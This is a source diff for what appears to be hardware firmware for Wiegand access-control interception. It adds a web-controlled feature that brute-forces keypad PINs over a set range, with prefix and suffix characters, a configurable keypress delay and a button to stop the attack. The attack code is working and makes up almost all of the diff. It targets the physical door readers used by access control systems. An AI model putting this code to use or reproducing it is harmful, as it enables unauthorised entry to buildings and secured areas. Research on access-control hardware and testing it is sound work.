@@ -77,6 +77,9 @@ int txdelayus;
 int txdelayms;
 int safemode;
 
+int TXstatus=0;
+String pinHTML;
+
 #include "pinSEND.h"
 
 WiegandNG wg;
@@ -1087,13 +1090,33 @@ void setup() {
     server.send_P(200, "text/html", License);
   });
 
+  server.on("/stoptx", [](){
+    server.send(200, "text/html", F("<html><body>This will kill any ongoing transmissions.<br><br>Are you sure?<br><br><a href=\"/stoptx/yes\">YES</a> - <a href=\"/\">NO</a></body></html>"));
+  });
+
+  server.on("/stoptx/yes", [](){
+    TXstatus=0;
+    server.send(200, "text/html", F("<a href=\"/\"><- BACK TO INDEX</a><br><br><a href=\"/experimental\"><- BACK TO EXPERIMENTAL TX MODE</a><br><br>All transmissions have been stopped."));
+  });
+
   server.on("/experimental", [](){
     String experimentalStatus="Awaiting Instructions";
 
-    if (server.hasArg("pinHTML")) {
-      String pinHTML=server.arg("pinHTML");
+    if (server.hasArg("pinHTML")||server.hasArg("bruteEND")) {
+      pinHTML=server.arg("pinHTML");
       int pinBITS=server.arg("pinBITS").toInt();
       int pinHTMLDELAY=server.arg("pinHTMLDELAY").toInt();
+      int bruteforcing;
+      int brutePAD=(server.arg("bruteSTART").length());
+      if (server.hasArg("bruteSTART")) {
+        bruteforcing=1;
+      }
+      else {
+        bruteforcing=0;
+      }
+
+      TXstatus=1;
+      
       wg.pause();
       digitalWrite(DATA0, HIGH);
       pinMode(DATA0,OUTPUT);
@@ -1102,111 +1125,168 @@ void setup() {
 
       experimentalStatus=String()+"Transmitting "+pinBITS+"bit Wiegand Format PIN: "+pinHTML+" with a "+pinHTMLDELAY+"ms delay between \"keypresses\"";
       
-      for (int i=0; i<=pinHTML.length(); i++) {
-        if (pinHTML.charAt(i) == '0') {
-          if (pinBITS==4) {
-            pinSEND(pinHTMLDELAY,"0000");
-          }
-          else if (pinBITS==8) {
-            pinSEND(pinHTMLDELAY,"11110000");
-          }
-        }
-        else if (pinHTML.charAt(i) == '1') {
-          if (pinBITS==4) {
-            pinSEND(pinHTMLDELAY,"0001");
-          }
-          else if (pinBITS==8) {
-            pinSEND(pinHTMLDELAY,"11100001");
-          }
-        }
-        else if (pinHTML.charAt(i) == '2') {
-          if (pinBITS==4) {
-            pinSEND(pinHTMLDELAY,"0010");
-          }
-          else if (pinBITS==8) {
-            pinSEND(pinHTMLDELAY,"11010010");
-          }
-        }
-        else if (pinHTML.charAt(i) == '3') {
-          if (pinBITS==4) {
-            pinSEND(pinHTMLDELAY,"0011");
-          }
-          else if (pinBITS==8) {
-            pinSEND(pinHTMLDELAY,"11000011");
-          }
-        }
-        else if (pinHTML.charAt(i) == '4') {
-          if (pinBITS==4) {
-            pinSEND(pinHTMLDELAY,"0100");
-          }
-          else if (pinBITS==8) {
-            pinSEND(pinHTMLDELAY,"10110100");
-          }
-        }
-        else if (pinHTML.charAt(i) == '5') {
-          if (pinBITS==4) {
-            pinSEND(pinHTMLDELAY,"0101");
-          }
-          else if (pinBITS==8) {
-            pinSEND(pinHTMLDELAY,"10100101");
-          }
-        }
-        else if (pinHTML.charAt(i) == '6') {
-          if (pinBITS==4) {
-            pinSEND(pinHTMLDELAY,"0110");
-          }
-          else if (pinBITS==8) {
-            pinSEND(pinHTMLDELAY,"10010110");
-          }
-        }
-        else if (pinHTML.charAt(i) == '7') {
-          if (pinBITS==4) {
-            pinSEND(pinHTMLDELAY,"0111");
-          }
-          else if (pinBITS==8) {
-            pinSEND(pinHTMLDELAY,"10000111");
-          }
-        }
-        else if (pinHTML.charAt(i) == '8') {
-          if (pinBITS==4) {
-            pinSEND(pinHTMLDELAY,"1000");
-          }
-          else if (pinBITS==8) {
-            pinSEND(pinHTMLDELAY,"01111000");
-          }
-        }
-        else if (pinHTML.charAt(i) == '9') {
-          if (pinBITS==4) {
-            pinSEND(pinHTMLDELAY,"1001");
-          }
-          else if (pinBITS==8) {
-            pinSEND(pinHTMLDELAY,"01101001");
-          }
-        }
-        else if (pinHTML.charAt(i) == '*') {
-          if (pinBITS==4) {
-            pinSEND(pinHTMLDELAY,"1010");
-          }
-          else if (pinBITS==8) {
-            pinSEND(pinHTMLDELAY,"01011010");
-          }
-        }
-        else if (pinHTML.charAt(i) == '#') {
-          if (pinBITS==4) {
-            pinSEND(pinHTMLDELAY,"1011");
-          }
-          else if (pinBITS==8) {
-            pinSEND(pinHTMLDELAY,"01001011");
-          }
-        }
+      int bruteSTART;
+      int bruteEND;
+      if (server.hasArg("bruteSTART")) {
+        bruteSTART=server.arg("bruteSTART").toInt();
+      }
+      else {
+        bruteSTART=0;
       }
       
+      if (server.hasArg("bruteEND")) {
+        bruteEND=server.arg("bruteEND").toInt();
+      }
+      else {
+        bruteEND=0;
+      }
+
+      if (server.hasArg("bruteSTART")) {
+        server.send(200, "text/html", String()+"<a href=\"/\"><- BACK TO INDEX</a><br><br><a href=\"/experimental\"><- BACK TO EXPERIMENTAL TX MODE</a><br><br>Brute forcing "+pinBITS+"bit Wiegand Format PIN from "+bruteSTART+" to "+bruteEND+" with a "+pinHTMLDELAY+"ms delay between \"keypresses\"<br>This may take a while, your device will be busy until the sequence has been completely transmitted!<br>Please \"STOP CURRENT TRANSMISSION\" before attempting to use your device or simply wait for the transmission to finish.<br>You can view if the brute force attempt has completed by returning to the Experimental TX page and checking the status located under \"Bruteforce PIN\"<br><br><a href=\"/stoptx\"><button>STOP CURRENT TRANSMISSION</button></a>");
+        delay(50);
+      }
+
+      String bruteSTARTchar="";
+      String bruteENDchar="";
+      if (server.hasArg("bruteSTARTchar")&&(server.arg("bruteSTARTchar")!="")) {
+        bruteSTARTchar=(server.arg("bruteSTARTchar"));
+      }
+      if (server.hasArg("bruteENDchar")&&(server.arg("bruteENDchar")!="")) {
+        bruteENDchar=(server.arg("bruteENDchar"));
+      }
+
+      for (int brute=bruteSTART; brute<=bruteEND; brute++) {
+
+        if (bruteforcing==1) {
+          pinHTML=String(brute);
+          while (pinHTML.length()<brutePAD) {
+            pinHTML="0"+pinHTML;
+          }
+        }
+
+        if (bruteSTARTchar!="") {
+          pinHTML=bruteSTARTchar+pinHTML;
+        }
+
+        if (bruteENDchar!="") {
+          pinHTML=pinHTML+bruteENDchar;
+        }
+          
+        for (int i=0; i<=pinHTML.length(); i++) {
+          if (pinHTML.charAt(i) == '0') {
+            if (pinBITS==4) {
+              pinSEND(pinHTMLDELAY,"0000");
+            }
+            else if (pinBITS==8) {
+              pinSEND(pinHTMLDELAY,"11110000");
+            }
+          }
+          else if (pinHTML.charAt(i) == '1') {
+            if (pinBITS==4) {
+              pinSEND(pinHTMLDELAY,"0001");
+            }
+            else if (pinBITS==8) {
+              pinSEND(pinHTMLDELAY,"11100001");
+            }
+          }
+          else if (pinHTML.charAt(i) == '2') {
+            if (pinBITS==4) {
+              pinSEND(pinHTMLDELAY,"0010");
+            }
+            else if (pinBITS==8) {
+              pinSEND(pinHTMLDELAY,"11010010");
+            }
+          }
+          else if (pinHTML.charAt(i) == '3') {
+            if (pinBITS==4) {
+              pinSEND(pinHTMLDELAY,"0011");
+            }
+            else if (pinBITS==8) {
+              pinSEND(pinHTMLDELAY,"11000011");
+            }
+          }
+          else if (pinHTML.charAt(i) == '4') {
+            if (pinBITS==4) {
+              pinSEND(pinHTMLDELAY,"0100");
+            }
+            else if (pinBITS==8) {
+              pinSEND(pinHTMLDELAY,"10110100");
+            }
+          }
+          else if (pinHTML.charAt(i) == '5') {
+            if (pinBITS==4) {
+              pinSEND(pinHTMLDELAY,"0101");
+            }
+            else if (pinBITS==8) {
+              pinSEND(pinHTMLDELAY,"10100101");
+            }
+          }
+          else if (pinHTML.charAt(i) == '6') {
+            if (pinBITS==4) {
+              pinSEND(pinHTMLDELAY,"0110");
+            }
+            else if (pinBITS==8) {
+              pinSEND(pinHTMLDELAY,"10010110");
+            }
+          }
+          else if (pinHTML.charAt(i) == '7') {
+            if (pinBITS==4) {
+              pinSEND(pinHTMLDELAY,"0111");
+            }
+            else if (pinBITS==8) {
+              pinSEND(pinHTMLDELAY,"10000111");
+            }
+          }
+          else if (pinHTML.charAt(i) == '8') {
+            if (pinBITS==4) {
+              pinSEND(pinHTMLDELAY,"1000");
+            }
+            else if (pinBITS==8) {
+              pinSEND(pinHTMLDELAY,"01111000");
+            }
+          }
+          else if (pinHTML.charAt(i) == '9') {
+            if (pinBITS==4) {
+              pinSEND(pinHTMLDELAY,"1001");
+            }
+            else if (pinBITS==8) {
+              pinSEND(pinHTMLDELAY,"01101001");
+            }
+          }
+          else if (pinHTML.charAt(i) == '*') {
+            if (pinBITS==4) {
+              pinSEND(pinHTMLDELAY,"1010");
+            }
+            else if (pinBITS==8) {
+              pinSEND(pinHTMLDELAY,"01011010");
+            }
+          }
+          else if (pinHTML.charAt(i) == '#') {
+            if (pinBITS==4) {
+              pinSEND(pinHTMLDELAY,"1011");
+            }
+            else if (pinBITS==8) {
+              pinSEND(pinHTMLDELAY,"01001011");
+            }
+          }
+        }
+
+        server.handleClient();
+        if (TXstatus!=1) {
+          break;
+        }
+
+      }
       pinMode(DATA0, INPUT);
       pinMode(DATA1, INPUT);
       wg.clear();
-
       pinHTML="";
       pinHTMLDELAY=100;
+      TXstatus=0;
+      bruteforcing=0;
+      brutePAD=0;
+      bruteSTARTchar="";
+      bruteENDchar="";
     }
 
 
@@ -1321,6 +1401,14 @@ void setup() {
       experimentalStatus=String()+"Outputting 3.3V on \"Push to Open\" wire for "+(server.arg("pushTime").toInt())+"ms.";
     }
 
+    String activeTX="";
+    if (TXstatus==1) {
+       activeTX="Transmitting PIN "+pinHTML+"<br><a href=\"/stoptx\"><button>STOP CURRENT ATTACK</button></a>";
+    }
+    else {
+      activeTX="INACTIVE<br><button>NOTHING TO STOP</button>";
+    }
+
     server.send(200, "text/html", 
       String()+
       F(
@@ -1362,6 +1450,20 @@ void setup() {
       "<INPUT form=\"transmitpin\" type=\"submit\" value=\"Transmit\"><br>"
       "</FORM>"
       "<br>"
+      "<hr>"
+      "<br>"
+      "<FORM action=\"/experimental\" id=\"brutepin\" method=\"post\">"
+      "<b>Bruteforce PIN:</b><br>"
+      "<small>PIN begins with character(s): </small><INPUT form=\"brutepin\" type=\"text\" name=\"bruteSTARTchar\" value=\"\" pattern=\"[0-9*#]{0,}\" title=\"Allowable character set(1234567890*#)\" size=\"8\"><br>"
+      "<small>PIN start position: </small><INPUT form=\"brutepin\" type=\"number\" name=\"bruteSTART\" value=\"0000\" minlength=\"1\" min=\"0\" size=\"8\"><br>"
+      "<small>PIN end position: </small><INPUT form=\"brutepin\" type=\"number\" name=\"bruteEND\" value=\"9999\" minlength=\"1\" min=\"0\" size=\"8\"><br>"
+      "<small>PIN ends with character(s): </small><INPUT form=\"brutepin\" type=\"text\" name=\"bruteENDchar\" value=\"#\" pattern=\"[0-9*#]{0,}\" title=\"Allowable character set(1234567890*#)\" size=\"8\"><br>"
+      "<small>Delay between \"keypresses\": </small><INPUT form=\"brutepin\" type=\"number\" name=\"pinHTMLDELAY\" value=\"3\" minlength=\"1\" min=\"0\" size=\"8\"><small>ms</small><br>"
+      "<INPUT form=\"brutepin\" type=\"radio\" name=\"pinBITS\" id=\"pinBITS\" value=\"4\" checked required> <small>4bit Wiegand PIN Format</small>   "
+      "<INPUT form=\"brutepin\" type=\"radio\" name=\"pinBITS\" id=\"pinBITS\" value=\"8\" required> <small>8bit Wiegand PIN Format</small><br>"
+      "<INPUT form=\"brutepin\" type=\"submit\" value=\"Transmit\"></FORM><br>"
+      "<br>"
+      "Brute force status: ")+activeTX+F("<br>"
       "<hr>"
       "<br>"
       "<b>Fuzzing:</b><br><br>"
